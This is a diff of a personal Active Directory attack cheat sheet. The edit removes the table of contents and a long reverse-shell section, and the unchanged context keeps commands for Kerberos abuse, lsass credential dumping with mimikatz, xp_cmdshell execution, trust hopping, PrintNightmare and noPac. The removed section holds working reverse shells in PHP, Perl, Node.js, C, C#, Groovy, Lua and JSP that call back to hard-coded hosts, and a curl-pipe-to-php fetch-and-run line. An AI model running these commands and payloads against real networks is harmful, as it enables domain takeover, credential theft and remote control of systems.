@@ -1,101 +1,11 @@
 ---
-title: 🪴 AD CheatSheet
+title: 📝 AD CheatSheet
 ---
 This is my personal safe for arsenals. Feel free to refer and use at anytime. You can also refer to this [arsenals](arsenals) for any extra commands (`Ctrl+f` will definitely help)
 
 **_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**
 
-* **[ACLs/ACEs permissions](#acls-possible-abuse)**
-* **[LDAP Filters as alternative](#ldap-filters)**
-* **[Situational Awareness](#situational-awaress)**
-	* **[Domain Enumeration](#domain-enumeration)**
-		* [Forest Trust](#forest-trust)
-		* [ASREP Roasting](#asrep-roasting)
-		* [Kerberoasting](#kerberoasting)
-		* [Unconstrained / Constrained Object](#unconstrained--constrained-object)
-	* **[Constrained Language Mode](#constrained-language-mode)**
-		* [CLM Enumeration](#clm-enumeration)
-		* [Dump lsass with rundll32](#dump-lsass-process-with-signed-binary)
-* **[Delegations](#delegations)**
-	* [Unconstrained Delegation](#unconstrained-delegation)
-		* [Printer Bug](#printer-bug)
-		* [Extract TGTs](#extract-tgt)
-	* [Constrained Delegation](#constrained-delegation)
-		* [s4u Delegation](#s4u-delegation)
-	* [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
-* **[ACLs/ACEs Abuse](#acls/aces-abuse)**
-	* [ForceChangeUserPassword](#force-change-user-password)
-	* [Change Password (with PSCredential](#change-password-with-credential)
-	* [Targeted Kerberoast](#targeted-kerberoast)
-	* [Add DCsync privilege to object](#add-dcsync-to-object)
-	* [Add Users to Group](#add-users-to-group)
-* **[Weak GPO Permission](#weak-gpo-permission)**
-	* [Enumerate weak GPO Permission](#enumerate-weak-gpo-permission)
-	* [GPO Abuse with PowerView](#gpo-abuse-with-powerview)
-* **[SQL Server Enumeration and Code Execution (PowerUpSQL)](#sql-server-enumeration-and-code-execution)**
-	* [Get SQL Instances](#get-sql-instances)
-	* [Get SQL Linked Server](#get-sql-linked-server)
-	* [Execute SQL Query and OS Command](#execute-sql-query-and-os-command)
-* **[Domain Trust Hopping](#domain-trust-hopping)**
-	* [Child-Parent Domain Escalation](#child-parent-domain-escalation)
-* **[Forest Trust Hopping](#forest-trust-hopping)**
-	* [SID History](#sid-history)
-	* [Shadow Principal](#shadow-principal)
-	* [Foreign Principal](#foreign-principal)
-	* [Trust Account](#trust-account)
-* **[Lateral Movement / Post Exploitation](#lateral-movement--post-exploitation)**
-	* [Overpass-The-Hash](#overpass-the-hash-opth)
-	* [Request TGT](#request-tgt)
-	* [runas](#runas)
-	* [NTLM Relay](#ntlm-relay)
-	* [Credential Harvesing](#credential-harvesting)
-		* [DCSync](#dcsync)
-* **[Persistence](#persistence)**
-	* [Golden Ticket](#golden-ticket)
-	* [Diamond Ticket](#diamond-ticket)
-	* Skeleton Keys
-	* Shortcuts
-	* [msDS-AllowedToDelegateTo](#msds-allowedtodelegateto)
-	* Scheduled Tasks
-	* AdminSDHolder
-	* [Registry Keys](#registry-keys)
-		* [Execute on startup](#execute-on-startup)
-		* Recycle Bin
-	* [krbtgt Constrained Delegation](#krbtgt-constrained-delegation)
-* **[Remote Access](#remote-authentication-protocol)**
-	* [PSRemoting](#ps-remoting)
-	* [Winrs](#winrs)
-	* [PsExec](#psexec)
-	* [WMI](#wmi)
-	* [DCOM](#dcom)
-* **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
-	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
-	* [Covenant Grunt](#convenant-grunt)
-* **[Low Hanging Fruits](#low-hanging-fruits)**
-	* [ZeroLogon](#zerologon)
-	* [HiveNightmare](#hivenightmare)
-* **[PrintNightmare](#printnightmare)**
-* **[noPac](#nopac)**
-* **[Active Directory Certificate Service](#ADCS)**
-	* [PKI Abuse](#pki-abuse)
-	* [ESC1](#esc1)
-	* [ESC4](#esc4)
-	* [ESC8](#esc8)
-	* [Certifried](#certifried)
-* **[Relay Notes](#relay-notes)**
-* **[File Transfer](#file-transfer)**
-* **[Reverse Shells](#reverse-shells)**
-	* [php](#php-reverse-shell)
-	* [perl](#perl-reverse-shell)
-	* [nodejs](#nodejs-reverse-shell)
-	* [c](#c-reverse-shell)
-	* [c#](#c-sharp-reverse-shell)
-	* [jenkins](#jenkins-reverse-shell)
-	* [lua](#lua-reverse-shell)
-	* [jsp](#jsp-reverse-shell)
-
-
-# ACLs possible abuse
+## ACLs possible abuse
 ACL/ACE | Object | Permission | Abuse | ScreenShot
 --- | --- | --- | --- | ---
 **GenericAll** | User  | Full rights | [Force change user's password](#force-change-user-password), [Targeted Kerberoast](#targeted-kerberoast), Shadow Credentials | ![[GenericAll_user.PNG]]
@@ -112,7 +22,7 @@ ACL/ACE | Object | Permission | Abuse | ScreenShot
 **ExtendedRights** | Group  | Read LAPS Password | [Read LAPS Password](#read-laps-local-administrator-password) |
 **User-Force-Change-Password** | User | change user's password | [Force change user's password](#force-change-user-password) | ![[Force-Change-User-Password.PNG]]
 
-# LDAP Filters
+## LDAP Filters
 | PowerView                            | Description                            | LDAP Filter                                                                                  |
 | ------------------------------------ | -------------------------------------- | -------------------------------------------------------------------------------------------- |
 | `Get-DomainController`               | Get current domain controller          | `(userAccountControl:1.2.840.113556.1.4.803:=8192)`                                          |
@@ -140,8 +50,7 @@ $adsiSearcherObj.FindAll()
 ```
 _Note: These LDAP filters can be used with `[adsisearcher]` builtin function in powershell. Any extra commands can be found [here](https://mlcsec.com/active-directory-domain-enumeration-part-2). Amazing cheatsheet by [@mlcsec](https://twitter.com/mlcsec)_
 
-# Situational Awareness
-## Domain Enumeration
+## Situational Awareness
 ### Forest Trust
 ```
 # Map all domain trusts
@@ -196,7 +105,7 @@ mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
 mimikatz# sekurlsa::logonpasswords
 ```
 
-# Delegations
+## Delegations
 ## Unconstrained Delegation
 ### Printer Bug
 Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
@@ -276,7 +185,7 @@ This attack is possible if owned user/computer object has _GenericWrite_ or writ
 1. [Harmj0y's gist on abusing RBCD with PowerShell/PowerView/PowerMad](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
 2. [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
 
-# ACLs/ACEs Abuse
+## ACLs/ACEs Abuse
 ### Force Change User Password
 _Note: This doesn't require you to know the owned user's credential_
 ```
@@ -339,7 +248,7 @@ This will only possible if you have _AllExtendedRights_ permission on a computer
 Get-DomainComputer -Properties ms-mcs-admpwd
 ```
 
-# Weak GPO Permission
+## Weak GPO Permission
 ### Enumerate weak GPO Permission
 ```
 # Domain wide
@@ -358,7 +267,7 @@ New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArgumen
 gpoupdate /force
 ```
 
-# SQL Server Enumeration and Code Execution
+## SQL Server Enumeration and Code Execution
 I did most of my SQL Server Enumeration by using this [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL) script. Refer to more commands in this [PowerUpSQL Cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
 ### Get SQL Instances
 This method will allow you to enumerate local or domain sql servers(if any).
@@ -390,7 +299,7 @@ Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;''
 Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
 Invoke-SQLOSCmd -Instance DB-SQLSRV -Command "whoami"
 ```
-# Domain Trust Hopping
+## Domain Trust Hopping
 ### Child-Parent Domain Escalation
 This attack made possible since there is no security boundary between domains. Hence we could forge a golden ticket that contains _extra sid_ of a parent domain's _Enterprise Admins_. Below are the requirements to perform this attack:
 
@@ -421,7 +330,7 @@ Above steps could be automated with [raiseChild.py](https://github.com/SecureAut
 raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashes :2e8a408a8aec852ef2e458b938b8c071 -debug
 ```
 
-# Forest Trust Hopping
+## Forest Trust Hopping
 ### SID History
 This attack path is only applicable when **SID Filtering is disabled** and **SID History is enabled**. You can read the in-depth [blogpost](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d) on this by harmj0y.
 1. Check for `trustAttributes`  attribute. Make sure SID History is enabled
@@ -487,7 +396,7 @@ Rubeus.exe asktgt /user:RANGE$ /rc4:4cc0dd338664b4208fa6a1a4a7bee224 /domain:kiw
 getTGT.py kiwi.local/range\$ -hashes :4cc0dd338664b4208fa6a1a4a7bee224 -dc-ip 192.168.86.189
 ```
 3. Now you should be able to use the retrieved TGT to interact with the trusted forest.
-# Lateral Movement / Post Exploitation
+## Lateral Movement / Post Exploitation
 ### Overpass-The-Hash (OPTH)
 _Note: This requires local administrator privilege_
 ```
@@ -669,7 +578,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 	```
 You can read more from this great [article](https://skyblue.team/posts/delegate-krbtgt/) from [citronneur](https://twitter.com/citronneur). _CAVEAT: This is not really an OPSEC safe choice to perform persistence. So please be extra careful and cautious when executing the above steps_
 
-# Remote Authentication Between Computers
+## Remote Authentication Between Computers
 ### PS Remoting
 **PS Remoting** stands for PowerShell remoting, this will enable users to authenticate between powershell session in remote computers by using `*-PSSession`.
 ```
@@ -773,7 +682,7 @@ wscript.exe .\realtest.vbs
 * [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) - Check for signature based detection, this support AMSI check as well
 * [ADConnect Dump](https://github.com/fox-it/adconnectdump) - Dumps Azure On-Prem ADConnect
 
-# Low Hanging Fruits
+## Low Hanging Fruits
 ### ZeroLogon
 Set the computer account's password to null allowing attackers to perform [DCSync](#dcsync) attack with null authentication
 1. Run exploit script [here](https://github.com/risksense/zerologon.git)
@@ -834,7 +743,7 @@ smbserver.py smbshare `pwd` -smb2support
 python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10\smbshare\encme.dll' [-hashes :NTLM]
 ```
 
-# noPac
+## noPac
 This exploit will require a valid domain user regardless the level of privilege given as long as it can create a computer account on the domain. Here are the steps.
 
 1. Create a fake computer with [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad) script.
@@ -897,7 +806,7 @@ net computer \\FakeComputer /delete
 ### Reference 
 https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
 
-# ADCS
+## ADCS
 
 ### PKI Abuse
 It is recommended to use below commands with `-k` option and .cacche file. Please refer [Request TGT](#request-tgt) section
@@ -1103,7 +1012,7 @@ For the details explanation of the vulnerability (CVE-2022-26923), you may read 
 * https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay
 * https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
 
-# File Transfer
+## File Transfer
 
 | **Command** | **Description** |
 | --------------|-------------------|
@@ -1118,195 +1027,6 @@ For the details explanation of the vulnerability (CVE-2022-26923), you may read 
 | `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
-
-# Reverse Shells
-_Credits: These reverse shells examples are reffered to [EzpzShell](https://github.com/H0j3n/EzpzShell) by [@h0j3n](https://twitter.com/h0j3n)_
-### php reverse shell
-You can get a full reverse shell script [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) by PentestMonkey
-```
-<?php system("curl http://192.168.86.139/shell.php|php"); ?>
-```
-
-### perl reverse shell
-```
-# Example 1
-perl -e 'use Socket;$i="192.168.86.139";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
-# Example 2
-use Socket
-
-$i="192.168.86.139";
-$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
-if(connect(S,sockaddr_in($p,inet_aton($i)))){
-    open(STDIN,">&S");
-    open(STDOUT,">&S");
-    open(STDERR,">&S");
-    exec("/bin/sh -i");
-}
-```
-
-### nodejs reverse shell
-```
-# Example 1
-require('child_process').exec('nc -e /bin/sh 192.168.86.139 9001')
-
-# Example 2
-(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect(9001, "192.168.86.139", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/; // Prevents the Node.js application form crashing
-})();
-```
-
-### c reverse shell
-```
-######################### Example 1 #############################
-## Compile : gcc -shared -o libchill.so -fPIC libchill.c
-
-#include<stdio.h>
-#include<stdlib.h>
-#include<unistd.h>
-int greetings(){
-    setuid(0);
-    setgid(0);
-    system("/bin/bash");
-}
-
-
-######################### Example 2 #############################
-## Compile : gcc shell.c -o shell
-
-#include <stdio.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-
-int main(void){
-    int port = 9001;
-    struct sockaddr_in revsockaddr;
-
-    int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;       
-    revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("192.168.86.139");
-
-    connect(sockt, (struct sockaddr *) &revsockaddr,
-    sizeof(revsockaddr));
-    dup2(sockt, 0);
-    dup2(sockt, 1);
-    dup2(sockt, 2);
-
-    char * const argv[] = {"/bin/sh", NULL};
-    execve("/bin/sh", argv, NULL);
-
-    return 0;       
-}
-```
-
-### c# reverse shell
-This c-sharp reverse shell is from [PuckieStyle Blog](https://www.puckiestyle.nl/c-simple-reverse-shell/)._Note: Change `cmd.exe` to `bash` if you are using against linux environment_
-```
-using System;
-using System.Text;
-using System.IO;
-using System.Diagnostics;
-using System.ComponentModel;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
-
-
-namespace ConnectBack
-{
-	public class Program
-	{
-		static StreamWriter streamWriter;
-
-		public static void Main(string[] args)
-		{
-			using(TcpClient client = new TcpClient("10.0.2.15", 443))
-			{
-				using(Stream stream = client.GetStream())
-				{
-					using(StreamReader rdr = new StreamReader(stream))
-					{
-						streamWriter = new StreamWriter(stream);
-
-						StringBuilder strInput = new StringBuilder();
-
-						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
-
-						while(true)
-						{
-							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
-							p.StandardInput.WriteLine(strInput);
-							strInput.Remove(0, strInput.Length);
-						}
-					}
-				}
-			}
-		}
-
-		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-        {
-            StringBuilder strOutput = new StringBuilder();
-
-            if (!String.IsNullOrEmpty(outLine.Data))
-            {
-                try
-                {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
-                }
-                catch (Exception err) { }
-            }
-        }
-
-	}
-}
-```
-
-### jenkins reverse shell
-```
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.86.139/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-```
-
-### lua reverse shell
-```
-# Example 1
-os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")
-
-# Example 2
-lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")'
-```
-
-### jsp reverse shell
-```
-# Msfvenom => msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.86.139 LPORT=9001 -f raw > shell.jsp
-```
 
 # References
 * https://www.harmj0y.net/
